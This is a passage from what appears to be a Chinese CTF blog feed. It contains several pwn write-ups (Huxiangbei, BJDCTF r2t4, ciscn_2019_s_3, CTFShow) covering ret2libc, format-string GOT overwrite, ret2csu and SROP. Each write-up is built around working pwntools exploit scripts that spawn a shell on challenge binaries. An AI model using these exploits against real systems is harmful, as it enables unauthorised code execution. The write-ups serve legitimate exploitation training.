class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure><p>跟进if下面的函数</p><p><img src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" alt="在这里插入图片描述"></p><p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。<br>再然后a * a1，所以传参需要double 0x20，也就是0x40<br><code>ROPgadget --binary pwn_printf</code><br>找到pop_rdi_ret的地址<br>复习一下libc64_payload公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span>位payload: payload = <span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span><br></pre></td></tr></table></figure><p>写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">n.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure><p>这就print出来了puts的地址</p><p><img src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" alt="在这里插入图片描述"></p><p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p><p>在套用一下公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span><span class="comment"># +libc_Offset的bin/sh</span></span><br></pre></td></tr></table></figure><p>复习一下libc64_getshell公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">sh.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span> <span class="comment">#0x6f6a0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span> <span class="comment">#0x0453a0</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span> <span class="comment">#0x18ce17 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4007C6</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;湖湘杯hxb-pwn&quot;&gt;&lt;a href=&quot;#湖湘杯hxb-pwn&quot; class=&quot;headerlink&quot; title=&quot;湖湘杯hxb_pwn&quot;&gt;&lt;/a&gt;湖湘杯hxb_pwn&lt;/h1&gt;</summary>
    
    
    
    <category term="比赛WriteUp" scheme="https://trick.ink/categories/%E6%AF%94%E8%B5%9BWriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>_stack_chk_fail</title>
    <link href="https://trick.ink/article/stack_chk_fail/"/>
    <id>https://trick.ink/article/stack_chk_fail/</id>
    <published>2021-09-28T19:45:18.736Z</published>
    <updated>2021-07-24T06:30:26.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="stack-chk-fail"><a href="#stack-chk-fail" class="headerlink" title="stack_chk_fail"></a>stack_chk_fail</h1><span id="more"></span><h4 id="BJDCTF-2nd"><a href="#BJDCTF-2nd" class="headerlink" title="BJDCTF_2nd"></a>BJDCTF_2nd</h4><h2 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h2><h4 id="格式化字符串-stack-chk-fail"><a href="#格式化字符串-stack-chk-fail" class="headerlink" title="格式化字符串 + _stack_chk_fail"></a>格式化字符串 + _stack_chk_fail</h4><p>看ida</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180634.png" alt="20201223180634"></p><p>checksec发现开启了canary</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180812.png" alt="20201223180812"></p><p>所以不能利用简单的栈溢出了</p><p>发现printf函数有格式化字符串漏洞可以利用</p><p>并且程序给了backdoor，地址是：0x400626</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180855.png" alt="20201223180855"></p><p>思路是通过这个漏洞，把 stack_chk_fail 的 got表给改掉，改成 backdoor 的地址，这样当程序发现 canary 被修改去调用 stack_chk_fail 的时候就调用了 backdoor</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223181044.png" alt="20201223181044"></p><p>手撸出printf格式化字符串的偏移</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223181608.png" alt="20201223181608"></p><p>确定是第六个</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,word_size=<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span> + p64(__stack_chk_fail+<span class="number">2</span>) + p64(__stack_chk_fail)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>9=6+3，3是<code>&quot;%64c%9$hn%1510c%10$hnAAA&quot;</code>占了24个比特，也就是3个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%64c%9$hn           %64c：0x0040（目标地址高位）            %9：更改第九位数字      $hn：两个字节（0000 0000 （八比特））</span><br><span class="line">%1510c%10$hnAAA     %1510c：1510+64&#x3D;0x0626（目标地址低位）  %10：更改第十位数字     $hn：两个字节   AAA:补齐成8的倍数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>参考：<a href="https://blog.csdn.net/qin9800/article/details/105058058">https://blog.csdn.net/qin9800/article/details/105058058</a></p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191550.png" alt="20201223191550"></p><p>用 <code>ssh -p 28572 ctf@node3.buuoj.cn</code> 链接</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191650.png" alt="20201223191650"></p><p>发现三个文件，flag文件无法cat</p><p>看一下c文件</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191806.png" alt="20201223191806"></p><p>发现是过滤命令</p><p>可以通过</p><p><code>ls /usr/bin/ /bin/ | grep -v -E &quot;n|e|p|b|u|s|h|i|f|l|a|g&quot;</code></p><p>查看还有什么命令是可以用的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-v 或 --revert-match : 显示不包含匹配文本的所有行。</span><br><span class="line">-E 或 --extended-regexp : 将样式为延伸的正则表达式来使用。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223192201.png" alt="20201223192201"></p><p>可以用 od 和 x86_64</p><p>Linux od命令用于输出文件内容。</p><p>od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p><p>x86_64</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223193256.png" alt="20201223193256"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;stack-chk-fail&quot;&gt;&lt;a href=&quot;#stack-chk-fail&quot; class=&quot;headerlink&quot; title=&quot;stack_chk_fail&quot;&gt;&lt;/a&gt;stack_chk_fail&lt;/h1&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://trick.ink/categories/WriteUp/"/>
    
    
    <category term="Canary" scheme="https://trick.ink/tags/Canary/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://trick.ink/article/SROP/"/>
    <id>https://trick.ink/article/SROP/</id>
    <published>2021-09-28T19:45:18.723Z</published>
    <updated>2021-07-24T06:30:51.519Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><span id="more"></span><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="_ciscn_2019_s_3"></a>_ciscn_2019_s_3</h2><p>main里只有一个vuln函数<br>直接进去看</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202170418.png" alt="205415324135211"></p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202171801.png" alt="202"></p><p>看汇编分析：</p><p>需要在栈上构造/bin/sh，并且需要rax=59让64位的syscall执行execve才能getshell</p><p>64 位：系统调用号放入 rax，参数依次放到 rdi、rsi、rdx，返回值放在 rax</p><p>64位程序前六个寄存器调用顺序：rdi rsi rdx rcx r8 r9</p><p>寄存器大概布局：<br>rax = 59<br>rdi = /bin/sh<br>rsi = 0<br>rdx = 0</p><p>注意到vuln函数末尾并没有使用leave指令，即直接把之前push的rbp当作return address<br>我们要ROP的话offset只需要0x10</p><p>先构造/bin/sh在栈中</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211800.png" alt="20201202211800"></p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211855.png" alt="20201202211855"></p><p>发现/bin/sh已经在栈中了，在打印到0x20的时候，接下来是打印出来一个地址，这也是为什么需要recv的原因，这个地址是栈上面的，所以只要算出这个地址和/bin/sh地址的相对偏移，就可以在程序每次执行的时候算出binsh的地址了，因为地址会变，但是偏移不会</p><p>我们输出了地址stack_addr</p><p>计算偏移量 0x7ffdc7824d78 - 0x007FFDC7824C60 = 0x118</p><p>所以计算binsh_addr = stack_addr - 0x118</p><p>构造完/bin/sh之后，在程序中有给我们一个gadgets函数：</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201203155951.png" alt="20201203155951"></p><p>只要我们跳到地址0x4004E2就能把3Bh（59）赋值给rax，这样系统调用号的参数也搞定了</p><p>接下来可以利用csu把 rsi = 0，rdx = 0 ，最后用pop rdi ; ret存上/bin/sh就万事大吉了</p><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201203161803.png" alt="20201203161803"></p><p>需要注意的是call这个地方call的是r12地址上的内容，我们这里要call的是mov rax,3Bh ，而mov rax,3Bh可以存在/bin/sh\x00aaaaaaaa(一共长0x10)后面，所以r12 = binsh_addr + 0x10</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27933</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line">pop_rbx_rbp_r12_r13_14_r15 = <span class="number">0x40059A</span></span><br><span class="line">mov_rdx_r13 = <span class="number">0x400580</span></span><br><span class="line">mov_rax_59 = <span class="number">0x4004E2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(mov_rax_59) </span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_14_r15) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(binsh_addr+<span class="number">0x10</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(mov_rdx_r13) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">6</span>*<span class="number">8</span>+<span class="number">8</span>) </span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/edumds">参考链接</a></p><h2 id="SROP-1"><a href="#SROP-1" class="headerlink" title="SROP"></a>SROP</h2><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.binary=(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">sigret=<span class="number">0x4004DA</span></span><br><span class="line">sys=<span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(pl1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(p.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip= sys</span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">pl2=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(pl2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/github_36788573/article/details/103541178">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;SROP&quot;&gt;&lt;a href=&quot;#SROP&quot; class=&quot;headerlink&quot; title=&quot;SROP&quot;&gt;&lt;/a&gt;SROP&lt;/h1&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://trick.ink/categories/WriteUp/"/>
    
    
    <category term="SROP" scheme="https://trick.ink/tags/SROP/"/>
    
  </entry>
  
  <entry>
    <title>CTFShow_0x1</title>
    <link href="https://trick.ink/article/CTFShow_0x1/"/>
    <id>https://trick.ink/article/CTFShow_0x1/</id>
    <published>2021-09-28T19:45:18.711Z</published>
    <updated>2021-07-24T06:31:12.627Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwn-CTFShow"><a href="#Pwn-CTFShow" class="headerlink" title="Pwn_CTFShow"></a>Pwn_CTFShow</h1><span id="more"></span><h2 id="1-PWN签到题"><a href="#1-PWN签到题" class="headerlink" title="1.PWN签到题"></a>1.PWN签到题</h2><p>直接 <code>nc</code></p><p>出flag，白给</p><h2 id="2-pwn02"><a href="#2-pwn02" class="headerlink" title="2.pwn02"></a>2.pwn02</h2><h3 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text 32"></a>ret2text 32</h3><p>file 一下<br><img src="https://img-blog.csdnimg.cn/20201003165432499.png#pic_center" alt="在这里插入图片描述"></p><p>32bit</p><p>IDA分析</p><p><img src="https://img-blog.csdnimg.cn/2020100316555337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>发现 bin/sh 地址</p><p>可以用 <code>cyclic</code>生成字符串，然后gdb run一下，再计算出偏移</p><p><img src="https://img-blog.csdnimg.cn/20201003165929850.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/202010031701141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201003170147811.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201003170222624.png#pic_center" alt="在这里插入图片描述"></p><p><code>cyclic -l 0x......</code></p><p><img src="https://img-blog.csdnimg.cn/20201003170357937.png#pic_center" alt="在这里插入图片描述"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28042</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x8048518</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-pwn03"><a href="#3-pwn03" class="headerlink" title="3.pwn03"></a>3.pwn03</h2><h3 id="libc-32"><a href="#libc-32" class="headerlink" title="libc 32"></a>libc 32</h3><p><a href="https://blog.csdn.net/gd_9988/article/details/106744216">参考博客</a></p><p>先<code>checksec</code>一下</p><p><img src="https://img-blog.csdnimg.cn/20201005131216747.png#pic_center"></p><p>32bit 程序<br>IDA分析<br>先看main函数</p><p><img src="https://img-blog.csdnimg.cn/20201005131301855.png#pic_center" alt="在这里插入图片描述"></p><p>没有什么线索，再进pwnme函数</p><p><img src="https://img-blog.csdnimg.cn/20201005131359321.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201005131425904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>发现存在一个栈溢出<br>由于找不到system函数的地址，所以</p><blockquote><p>涉及到plt表和got表<br>程序执行后，plt表里是got表的地址，got表是函数的真实地址<br>程序还未执行时，got表里还是plt表的地址<br>我们需要泄漏got表里的地址，由于开启了ASLR，本地和远程的地址不一样<br>但也只是针对于地址中间位进行随机，最低的12位并不会发生改变<br>也就是我们需要获取到远程环境的函数的真实地址<br>进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与/bin/sh的偏移，最终getshell<br>所以我们首先exp的构造<br>首先栈溢出，利用puts函数的plt表的地址，泄漏puts函数的got表中的函数的真实地址,然后返回地址填写main函数重新跳转回来</p></blockquote><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28063</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br></pre></td></tr></table></figure><p>输出了puts函数的真实地址<br>ps：这里要remote过去，否则输出的地址会不一样</p><p><img src="https://img-blog.csdnimg.cn/20201005133520774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以通过后三位判断libc的版本<br><a href="https://libc.blukat.me/">libcSearch</a></p><p><img src="https://img-blog.csdnimg.cn/20201005134105795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>知道这些信息之后<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 